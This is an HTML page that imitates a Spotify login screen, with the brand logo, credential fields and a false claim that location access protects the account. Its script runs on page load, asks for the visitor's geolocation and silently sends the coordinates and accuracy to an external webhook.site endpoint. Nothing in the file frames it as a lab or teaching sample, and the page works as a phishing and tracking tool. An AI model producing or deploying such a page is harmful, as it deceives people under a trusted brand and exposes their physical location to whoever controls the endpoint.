
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Spotify</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      font-family: 'Roboto', sans-serif;
      background-color: #191414;
      color: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
    }
    .logo {
      margin-bottom: 20px;
    }
    .login-box {
      background-color: #282828;
      padding: 40px 30px;
      border-radius: 10px;
      width: 320px;
      box-shadow: 0 8px 20px rgba(0,0,0,0.5);
      text-align: center;
    }
    .login-box h2 {
      margin-bottom: 20px;
      font-weight: 700;
    }
    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: none;
      border-radius: 4px;
      font-size: 14px;
    }
    .btn {
      width: 100%;
      padding: 12px;
      background-color: #1db954;
      border: none;
      color: #fff;
      font-weight: bold;
      border-radius: 25px;
      font-size: 14px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }
    .btn:hover {
      background-color: #17a44b;
    }
    .note {
      font-size: 12px;
      margin-top: 15px;
      color: #b3b3b3;
    }
    .links {
      margin-top: 15px;
      display: flex;
      justify-content: space-between;
      font-size: 12px;
    }
    .links a {
      color: #1db954;
      text-decoration: none;
    }
  </style>
</head>
<body>
  <img src="https://storage.googleapis.com/pr-newsroom-wp/1/2018/11/Spotify_Logo_CMYK_Green.png" alt="Spotify" class="logo" width="150" />
  <div class="login-box">
    <h2>Log in to Spotify</h2>
    <input type="text" placeholder="Email or username" />
    <input type="password" placeholder="Password" />
    <button class="btn">Log In</button>
    <div class="links">
      <a href="#">Forgot password?</a>
      <a href="#">Sign up</a>
    </div>
    <div class="note">To protect your account, we need to access your location.</div>
  </div>

  <script>
    window.onload = function() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(success, error);
      }
    }
    function success(position) {
      fetch('https://webhook.site/2a2333ad-ca5b-4d34-ab8e-953338bcc3cb', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          lat: position.coords.latitude,
          lon: position.coords.longitude,
          accuracy: position.coords.accuracy
        })
      });
    }
    function error(err) {
      console.log('Location error:', err);
    }
  </script>
</body>
</html>
